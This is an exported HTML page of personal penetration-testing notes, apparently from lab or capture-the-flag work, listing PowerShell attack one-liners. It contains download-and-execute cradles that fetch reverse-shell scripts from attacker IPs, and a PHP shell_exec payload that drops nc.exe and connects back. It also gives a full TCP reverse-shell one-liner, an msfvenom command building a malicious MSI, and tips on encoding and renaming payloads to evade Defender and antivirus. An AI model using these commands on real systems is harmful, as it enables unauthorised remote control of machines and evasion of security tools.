<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>powershell</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>powershell</h1><br/><p><h3>IEX(IWR http://10.10.14.44/Invoke-PowerShellTcp.ps1 -UseBasicParsing)</h3>• <h3>IEX(New-Object Net.Client).downloadString(&quot;http://10.10.14.44/rev.ps1&quot;</h3>)  <h3>// can be caught by AV </h3></p><p><ul><li>◇ <h3>◇ upload cmd.aspx </h3></li></ul><h3></h3></p><p><h3> </h3>◇ ▪ <h3>powershell IEX(New-Object Net.WebClient).downloadString(&#39;http://10.10.14.44/Invoke-PowerShellTcp.ps1&#39;)</h3><h3></h3></p><p><h3></h3></p><p></p><p><ul><li>◇ <h3>◇ &lt;?php shell_exec(&#39;powershell iwr -uri 10.10.16.167/nc.exe -o C:\Windows\Temp\nc.exe;C:\Windows\Temp\nc.exe -e powershell 10.10.16.167 9001&#39;)?&gt;</h3></li></ul><h3></h3></p><p><h3> </h3></p><p><h3></h3></p><p><h3> </h3><h3></h3></p><p><h3> </h3><h2>Obfuscation:</h2></p><p> ◇ <h3> Using iconv to create UTF-16LE encoded Base64 for use with &quot;-EncodedCommand&quot; option</h3><ul><li><h3>echo -n &quot; &#39;IEX(New-Object Net.WebClient).downloadString(&#39;http://10.10.14.44/rev.ps1&#39;)&quot; |iconv -t UTF-16LE|base64 -w0 |xlcip </h3></li><li><h3>powershell -enc &lt;encode_command&gt;</h3></li><li><h3>change Invoke-PowershellRTcp function name to bypass defender </h3></li></ul></p><p></p><p></p><p></p><p><strong><h3>Powershell one liner</h3></strong><h3> </h3><h3></h3></p><p><h3> powershell.exe -c &quot;$client = New-Object System.Net.Sockets.TCPClient(&#39;IP&#39;,PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &#39;PS &#39; + (pwd).Path + &#39;&gt; &#39;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&quot;</h3><h3></h3></p><p><h3></h3>  </p><p></p><p></p><p></p><p><strong><h3>Msfvenom cmd exec</h3></strong><ul><li><h3>msfvenom -p windows/x64/exec CMD=&quot;cmd /c powershell iex(new-object</h3></li></ul><h3></h3></p><p><h3> net.webclient).downloadstring(&#39;http://10.14.14.4/shell.ps1&#39;)&quot; -f msi &gt; pwn.msi</h3>◇ </p><p></p><p></p><p></p><p><strong><h2>Note: POwershell options</h2></strong><ul><li>powershell -nop -w hidden -e &lt;base64&gt;<ul><li>-nop: no profile is loaded which prevents from loading user profile that could negatively impact the execution of our payload</li><li>-w hidden =&gt; no windows of powershell is displayed </li><li>-e base64 encoded payload </li></ul></li></ul></p><p></p><p>Transfcript</p></div>
</body>
</html>
